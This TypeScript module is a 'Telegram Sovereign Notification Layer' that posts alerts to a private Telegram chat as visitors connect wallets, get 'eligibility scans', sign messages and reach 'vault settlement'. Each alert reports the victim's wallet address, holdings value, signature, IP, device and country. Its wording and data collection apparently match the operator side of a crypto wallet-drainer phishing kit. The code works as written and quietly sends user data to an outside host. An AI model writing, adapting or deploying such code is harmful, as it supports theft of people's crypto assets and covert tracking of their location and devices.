/**
 * Legion Engine — Telegram Sovereign Notification Layer
 * Sends institutional-grade alerts to Telegram for all key workflow events.
 * Private TELEGRAM_CHAT_ID only — full unmasked operational visibility.
 * Silent fail — never crashes the main flow.
 */

function getISTTimestamp(): string {
  return (
    new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    }) + ' IST'
  )
}

/** Exact literal for Telegram — no masking, truncation, or currency bucketing. */
function literalValue(value: string | number | null | undefined): string {
  if (value == null) return 'N/A'
  if (typeof value === 'number') {
    return Number.isFinite(value) ? String(value) : 'N/A'
  }
  const trimmed = String(value).trim()
  return trimmed === '' ? 'N/A' : trimmed
}

function codeLine(label: string, value: string | number | null | undefined): string {
  const v = literalValue(value)
  return `📌 <b>${label}:</b> <code>${v}</code>\n`
}

function appendInstitutionalFields(ctx?: TelegramRequestContext): string {
  if (!ctx) return ''
  let lines = ''
  if (ctx.chain_id != null && literalValue(ctx.chain_id) !== 'N/A') {
    lines += codeLine('Chain ID', ctx.chain_id)
  }
  if (ctx.chain_family != null && literalValue(ctx.chain_family) !== 'N/A') {
    lines += `⛓️ <b>Chain Family:</b> ${literalValue(ctx.chain_family)}\n`
  }
  if (ctx.wallet_type != null && literalValue(ctx.wallet_type) !== 'N/A') {
    lines += `👛 <b>Wallet Type:</b> ${literalValue(ctx.wallet_type)}\n`
  }
  if (ctx.scout_value_usd != null && literalValue(ctx.scout_value_usd) !== 'N/A') {
    lines += codeLine('Scout Value USD', ctx.scout_value_usd)
  }
  if (ctx.amount != null && literalValue(ctx.amount) !== 'N/A') {
    lines += codeLine('Amount', ctx.amount)
  }
  if (ctx.nonce != null && literalValue(ctx.nonce) !== 'N/A') {
    lines += codeLine('Nonce', ctx.nonce)
  }
  if (ctx.tx_hash != null && literalValue(ctx.tx_hash) !== 'N/A') {
    lines += codeLine('Settlement TX Hash', ctx.tx_hash)
  }
  if (ctx.tokenAddress != null && literalValue(ctx.tokenAddress) !== 'N/A') {
    lines += codeLine('Token Address', ctx.tokenAddress)
  }
  if (ctx.signature != null && literalValue(ctx.signature) !== 'N/A') {
    lines += codeLine('Signature', ctx.signature)
  }
  return lines
}

/** True when TELEMETRY_WEBHOOK_URL (+ chat id) or TELEGRAM_BOT_TOKEN path is wired. */
export function isTelegramConfigured(): boolean {
  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  if (rawUrl) {
    try {
      const parsed = new URL(rawUrl)
      const chatId = process.env['TELEGRAM_CHAT_ID']?.trim() || parsed.searchParams.get('chat_id')
      return Boolean(chatId)
    } catch {
      return Boolean(process.env['TELEGRAM_CHAT_ID']?.trim())
    }
  }
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()
  return Boolean(token && chatId)
}

/** Detect device/browser from User-Agent string */
export function detectDeviceFromUA(ua: string): string {
  if (!ua) return 'Unknown'
  const u = ua.toLowerCase()

  let device = 'Desktop'
  if (/iphone/.test(u)) device = 'iPhone'
  else if (/ipad/.test(u)) device = 'iPad'
  else if (/android.*mobile/.test(u)) device = 'Android Mobile'
  else if (/android/.test(u)) device = 'Android Tablet'
  else if (/mobile/.test(u)) device = 'Mobile'

  let browser = 'Unknown Browser'
  if (/edg\//.test(u)) browser = 'Edge'
  else if (/opr\/|opera/.test(u)) browser = 'Opera'
  else if (/brave/.test(u)) browser = 'Brave'
  else if (/chrome\//.test(u)) browser = 'Chrome'
  else if (/firefox\//.test(u)) browser = 'Firefox'
  else if (/safari\//.test(u) && !/chrome/.test(u)) browser = 'Safari'

  return `${browser} / ${device}`
}

/** Resolve client IP from request headers */
export function resolveClientIp(headers: Record<string, string | string[] | undefined>): string {
  const pick = (key: string): string | null => {
    const v = headers[key]
    if (!v) return null
    const s = Array.isArray(v) ? v[0] : v
    return s?.split(',')[0]?.trim() ?? null
  }
  return (
    pick('cf-connecting-ip') ??
    pick('x-real-ip') ??
    pick('x-forwarded-for') ??
    pick('x-client-ip') ??
    'Unknown'
  )
}

/** Get country flag + name from IP using ip-api.com (free, no key needed) */
async function getCountryFromIp(ip: string): Promise<string> {
  if (
    !ip ||
    ip === 'Unknown' ||
    ip === '::1' ||
    ip.startsWith('127.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.')
  ) {
    return '🏴 Local'
  }
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`, {
      signal: AbortSignal.timeout(3_000),
    })
    const data = (await res.json()) as { country?: string; countryCode?: string }
    if (data.country && data.countryCode) {
      const flag = data.countryCode
        .toUpperCase()
        .split('')
        .map((c: string) => String.fromCodePoint(0x1f1e6 - 65 + c.charCodeAt(0)))
        .join('')
      return `${flag} ${data.country}`
    }
  } catch {
    /* silent */
  }
  return '🌍 Unknown'
}

async function sendTelegramMessage(text: string): Promise<void> {
  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()

  let url: string | null = null
  let resolvedChatId: string | null = chatId ?? null

  if (rawUrl) {
    try {
      const parsed = new URL(rawUrl)
      if (!resolvedChatId) resolvedChatId = parsed.searchParams.get('chat_id')
      parsed.searchParams.delete('chat_id')
      url = parsed.toString()
    } catch {
      url = rawUrl
    }
  } else if (token && chatId) {
    url = `https://api.telegram.org/bot${token}/sendMessage`
  }

  if (!url || !resolvedChatId) {
    console.info('[TELEGRAM] TELEMETRY_WEBHOOK_URL or TELEGRAM_CHAT_ID not set — skipping notification')
    return
  }

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: resolvedChatId, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = (await res.json().catch(() => null)) as { ok?: boolean; description?: string } | null
    if (json && json.ok === false) {
      console.warn('[TELEGRAM] API error:', json.description)
    } else if (res.ok) {
      console.info('[TELEGRAM] Sent via', rawUrl ? 'TELEMETRY_WEBHOOK_URL' : 'TELEGRAM_BOT_TOKEN')
    }
  } catch (err) {
    console.warn('[TELEGRAM] Silent fail —', String(err))
  }
}

export interface TelegramRequestContext {
  ip?: string
  userAgent?: string
  sourceDomain?: string
  tokenName?: string
  tokenAddress?: string
  chain_family?: string
  chain_id?: string | number
  wallet_type?: string
  scout_value_usd?: string | number
  amount?: string
  nonce?: string
  tx_hash?: string
  signature?: string
}

// ─── Event Notifiers ───────────────────────────────────────────────────────────

export async function notifyWalletConnected(
  address: string,
  chainFamily: string,
  walletType: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const mergedCtx: TelegramRequestContext = {
    ...ctx,
    chain_family: ctx?.chain_family ?? chainFamily,
    wallet_type: ctx?.wallet_type ?? walletType,
  }

  const text =
    `🔌 <b>NEW WALLET CONNECTED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(mergedCtx) +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyScanComplete(
  address: string,
  totalUsd: number,
  assetsCount: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    codeLine('Total USD', totalUsd) +
    `📦 <b>Assets Found:</b> ${literalValue(assetsCount)}\n` +
    appendInstitutionalFields(ctx) +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifySignatureReceived(
  address: string,
  chainFamily: string,
  signature: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const mergedCtx: TelegramRequestContext = {
    ...ctx,
    chain_family: ctx?.chain_family ?? chainFamily,
    signature: ctx?.signature ?? signature,
  }

  const text =
    `✍️ <b>SIGNATURE ANCHORED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(mergedCtx) +
    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

function formatScheduleTimeIst(scheduledIso: string): string {
  try {
    return (
      new Date(scheduledIso).toLocaleString('en-IN', {
        timeZone: 'Asia/Kolkata',
        day: '2-digit',
        month: 'short',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true,
      }) + ' IST'
    )
  } catch {
    return scheduledIso
  }
}

export async function notifyBroadcastScheduled(
  scheduledTimeIso: string,
  address: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const displayTime = formatScheduleTimeIst(scheduledTimeIso)
  const text =
    `⏱️ <b>BROADCAST SCHEDULED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `<b>BROADCAST SCHEDULED:</b> ${displayTime}\n` +
    codeLine('Scheduled UTC', scheduledTimeIso) +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(ctx) +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyBroadcastConfirmed(
  txHash: string,
  address: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const mergedCtx: TelegramRequestContext = {
    ...ctx,
    tx_hash: ctx?.tx_hash ?? txHash,
  }
  const text =
    `📡 <b>BROADCAST CONFIRMED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `<b>BROADCAST CONFIRMED:</b> <code>${literalValue(txHash)}</code>\n` +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(mergedCtx) +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyVaultSettlement(
  address: string,
  txHash: string,
  scoutValueUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const mergedCtx: TelegramRequestContext = {
    ...ctx,
    scout_value_usd: ctx?.scout_value_usd ?? scoutValueUsd,
    tx_hash: ctx?.tx_hash ?? txHash,
  }

  const text =
    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(mergedCtx) +
    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    `✅ <b>Status:</b> CONFIRMED\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyError(
  endpoint: string,
  error: string,
  address?: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null

  const text =
    `❌ <b>SYSTEM ALERT</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `🚨 <b>Endpoint:</b> ${endpoint}\n` +
    `⚠️ <b>Error:</b> ${error}\n` +
    (address ? codeLine('Wallet Address', address) : '') +
    appendInstitutionalFields(ctx) +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyNewSignatureAnchorRequest(
  address: string,
  chainFamily: string,
  walletType: string,
  scoutValueUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const mergedCtx: TelegramRequestContext = {
    ...ctx,
    chain_family: ctx?.chain_family ?? chainFamily,
    wallet_type: ctx?.wallet_type ?? walletType,
    scout_value_usd: ctx?.scout_value_usd ?? scoutValueUsd,
  }

  const text =
    `⚡ <b>SETTLEMENT REQUEST INITIATED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', address) +
    appendInstitutionalFields(mergedCtx) +
    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}
